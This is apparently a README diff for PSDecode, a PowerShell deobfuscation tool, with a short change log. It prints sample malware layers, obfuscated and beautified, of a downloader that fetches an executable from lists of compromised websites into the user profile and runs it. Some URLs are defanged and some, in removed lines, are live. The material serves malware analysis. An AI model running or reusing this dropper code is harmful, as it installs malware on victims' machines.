("{0}{1}"-f'Zw','Uw'),'Z','iD');break;$jQDZUB=("{2}{1}{0}" -f'A',("{0}{1}" -f 'D','AA_'),'iBA')}}catch{}}$PGcAQBC=("{0}{1}"-f("{0}{1}" -f ("{0}{1}"-f'YU','AU'),'k'),'o')
+$ck_A4A=("{0}{1}" -f 'KA',("{0}{1}"-f 'AB','kDA'));$QAUAZD = '625';$rDAcAA=("{1}{0}"-f("{0}{1}" -f'B',("{1}{0}" -f 'o4','Xc')),'w');$PDkkkCA=$env:userprofile+'\'+$QAUAZD+("{0}{1}" -f '.','exe');$IAAAUDZ=("{1}{0}" -f ("{0}{1}" -f'CUQ','4'),("{0}{1}"-f'j','cwC'));$uox1Cw=&('new-o'+'b'+'ject') N`ET.WEbcL`ient;$zwQA1B=("{19}{35}{12}{28}{18}{17}{20}{14}{32}{30}{34}{10}{37}{29}{4}{36}{7}{15}{31}{13}{9}{6}{38}{33}{2}{1}{0}{26}{3}{25}{23}{24}{22}{8}{5}{16}{27}{21}{11}"-f'gi-',("{0}{1}{2}"-f 'dj.','com','/c'),'vi',("{0}{2}{1}"-f 'io','om','.c'),("{0}{1}{2}"-f ("{1}{0}"-f'om/w','c'),'p','-c'),("{0}{1}"-f("{1}{0}" -f 'rn','te'),'a'),'BF/','/',("{1}{0}{2}"-f'rix',("{1}{0}" -f't','://ma'),'in'),'PR','i',("{3}{2}{1}{0}"-f '/',("{1}{0}"-f'i','s/5Yx'),'/cs',("{0}{3}{1}{2}"-f 'it','Med','ia','e/')),("{1}{0}" -f'etp','/'),("{0}{1}"-f 'ads','/'),("{0}{3}{1}{2}" -f("{1}{0}" -f '/G6','in'),'7','/@h','3C'),'up','tio',("{0}{1}{2}" -f 'w','ar',("{0}{1}" -f 'ds.c','o')),("{0}{1}" -f'ome','na'),("{1}{0}"-f 'p','htt'),("{1}{0}{2}"-f'/wp','m',("{1}{0}"-f 'dm','-a')),("{0}{1}"-f 'om','/S'),("{1}{0}" -f'tp',("{0}{1}" -f'4/@','ht')),'/','6NA',("{1}{0}{2}{3}"-f 'rd','/wo','pre','ss'),("{7}{1}{2}{5}{8}{3}{6}{0}{4}{9}" -f 'ni',("{1}{0}"-f'n/KC','i'),'/',("{0}{1}"-f'tt','ps'),("{1}{0}" -f'po','ne'),'@',("{1}{0}{2}"-f 'www','://','.'),'b','h',("{1}{2}{0}"-f 'aud','w','er')),("{0}{1}"-f'na','l.c'),("{0}{1}" -f'rim','ew'),'.','p','lo','tt','ser',("{2}{3}{0}{1}"-f 'a',("{0}{1}"-f 'l','thyt'),':',("{1}{0}"-f '/he','/')),'s:/',("{2}{1}{0}" -f 'nt','e','ont'),'ck',("{2}{1}{0}" -f("{1}{0}" -f'//','p:'),'tt','@h'))."spL`it"('@');$bcBAQ_=("{2}{0}{1}" -f'AwD',("{0}{1}"-f'UAA','w'),'p');foreach($TGBQUB in $zwQA1B){try{$uox1Cw."Do`wNlO`ADFILE"($TGBQUB, $PDkkkCA);$aAZ4AADA=("{1}{0}"-f("{0}{1}"-f ("{1}{0}"-f 'U','AUD'),'D'),'B');If ((.('G'+'et'+'-Item') $PDkkkCA)."LE`NG`TH" -ge 28397) {.('Invok'+'e-Ite'+'m') $PDkkkCA;$TABD4UA=("{2}{0}{1}"-f'41A','Qc','O');break;$mCDZUA=("{1}{0}"-f("{1}{0}"-f 'D','oBc'),'mD')}}catch{}}$jZBCCA=("{0}{2}{1}"-f'TAA','x1','A')
+
 
 ############################## Layer 3 ##############################
-$bUAZ_k='NAcAcA';$uBAAoA = '403';$bA4AAww='NBZDoAQ';$nUAxDXG=$env:userprofile+'\'+$uBAAoA+'.exe';$hAk1AA='XGAAcAAA';$SAAGD1k=.('new-object') NeT.WebClieNT;$aUAUUA='http://tagkarma.com/dovij7lgjd/ki_oD/@http://simplatecplc.com/twitter-api/a_fx/@http://sertecii.com/dovij7lgjd/d_UA/@http://vvk888.ru/wp-content/Ds_G/@http://easyneti.com/wp-content/o_qO/'."SPLIT"('@');$lok_U_='MQXoAQQA';foreach($qA_kDUA in $aUAUUA){try{$SAAGD1k."doWNlOaDFiLe"($qA_kDUA, $nUAxDXG);$RA_CQ4QQ='OUAAQB';If ((&('Get-Item') $nUAxDXG)."LeNgTh" -ge 21389) {&('Invoke-Item') $nUAxDXG;$IAGAUU='iDZZwUw';break;$jQDZUB='iBADAA_A'}}catch{}}$PGcAQBC='YUAUko'
+$ck_A4A='KAABkDA';$QAUAZD = '625';$rDAcAA='wBXco4';$PDkkkCA=$env:userprofile+'\'+$QAUAZD+'.exe';$IAAAUDZ='jcwCCUQ4';$uox1Cw=&('new-object') NET.WEbcLient;$zwQA1B='hxxp://etprimewomenawards.com/wp-admin/G63C7/@hxxp://healthytick.com/wp-content/uploads/PRBF/@hxxp://servidj.com/cgi-bin/KC/@hxxp://www.ninepoweraudio.com/wordpress/6NA4/@hxxp://matrixinternational.com/Site/Media/css/5Yxi/'.spLit('@');$bcBAQ_='pAwDUAAw';foreach($TGBQUB in $zwQA1B){try{$uox1Cw.DowNlOADFILE($TGBQUB, $PDkkkCA);$aAZ4AADA='BAUDUD';If ((Get-Item $PDkkkCA)."LENGTH" -ge 28397) {Invoke-Item $PDkkkCA;$TABD4UA='O41AQc';break;$mCDZUA='mDoBcD'}}catch{}}$jZBCCA='TAAAx1'
+
 
 ######################### Beautified Layer ##########################
-$bUAZ_k='NAcAcA';
-$uBAAoA = '403';
-$bA4AAww='NBZDoAQ';
-$nUAxDXG=$env:userprofile+'\'+$uBAAoA+'.exe';
-$hAk1AA='XGAAcAAA';
-$SAAGD1k=.('new-object') NeT.WebClieNT;
-$aUAUUA='http://tagkarma.com/dovij7lgjd/ki_oD/@http://simplatecplc.com/twitter-api/a_fx/@http://sertecii.com/dovij7lgjd/d_UA/@http://vvk888.ru/wp-content/Ds_G/@http://easyneti.com/wp-content/o_qO/'."SPLIT"('@');
-$lok_U_='MQXoAQQA';
-foreach($qA_kDUA in $aUAUUA){
+$ck_A4A='KAABkDA';
+$QAUAZD = '625';
+$rDAcAA='wBXco4';
+$PDkkkCA=$env:userprofile+'\'+$QAUAZD+'.exe';
+$IAAAUDZ='jcwCCUQ4';
+$uox1Cw=&('new-object') NET.WEbcLient;
+$zwQA1B='hxxps://etprimewomenawards.com/wp-admin/G63C7/@hxxp://healthytick.com/wp-content/uploads/PRBF/@hxxp://servidj.com/cgi-bin/KC/@hxxps://www.ninepoweraudio.com/wordpress/6NA4/@hxxp://matrixinternational.com/Site/Media/css/5Yxi/'.spLit('@');
+$bcBAQ_='pAwDUAAw';
+foreach($TGBQUB in $zwQA1B){
 	try{
-		$SAAGD1k."doWNlOaDFiLe"($qA_kDUA, $nUAxDXG);
-		$RA_CQ4QQ='OUAAQB';
-		If ((&('Get-Item') $nUAxDXG)."LeNgTh" -ge 21389) {
-			&('Invoke-Item') $nUAxDXG;
-			$IAGAUU='iDZZwUw';
+		$uox1Cw.DowNlOADFILE($TGBQUB, $PDkkkCA);
+		$aAZ4AADA='BAUDUD';
+		If ((Get-Item $PDkkkCA)."LENGTH" -ge 28397) {
+			Invoke-Item $PDkkkCA;
+			$TABD4UA='O41AQc';
 			break;
-			$jQDZUB='iBADAA_A'}
+			$mCDZUA='mDoBcD'}
 		}
 	catch{
 		}
 	}
-$PGcAQBC='YUAUko'
+$jZBCCA='TAAAx1'
 
 
 ############################## Actions ##############################
-    1. [System.Net.WebClient.DownloadFile] Download From: http://tagkarma.com/dovij7lgjd/ki_oD/ --> Save To: C:\Users\REM\403.exe
-    2. [Get-Item.length] Retrieving length of 100000 for: C:\Users\REM\403.exe
-    3. [Invoke-Item] Execute/Open: C:\Users\REM\403.exe
+    1. [System.Net.WebClient.DownloadFile] Download From: hxxp://etprimewomenawards.com/wp-admin/G63C7/ --> Save To: C:\Users\REM\625.exe
+    2. [Get-Item.length] Returning length of 100000 for: C:\Users\REM\625.exe
+    3. [Invoke-Item] Execute/Open: C:\Users\REM\625.exe
 ```
 # Change Log
+* 2019.07.02
+  * Made beautification of final layer optional via -beautify switch because complex scripts can break the beautify logic resulting in even uglier output.
+  * Added -verbose switch that prints more details to the console regarding what PSDecode is doing during processing. Should help with troubleshooting.
+  * Added -dump switch. When specified, PSDecode will dump all decoded layers out to individual files so that users dont have to copy/paste from console.
+  * New-Object override now returns a valid object that was requested if a specific override doesnt exist. Should help to achieve successful detonation rate.
+  * Decoder script is now launched using System.Diagnostics.ProcessStartInfo which allows for greater control of processing and error handling. Decoder script errors are now captured and appended to the end of the output as formatted text.
+  * Decoder script is now base64 encoded prior to being executed. This preserves the original script text and will reduce failure rates due to strings within double-quotes being pre-maturely evaluated.
+  * Existing code-cleanup logic improved and additional code-cleanup logic implemented.
+  * Fixed text encoding detection logic.
 * 2019.05.20
   * Added Get-Item override.
   * Implemented string formatting resolver.
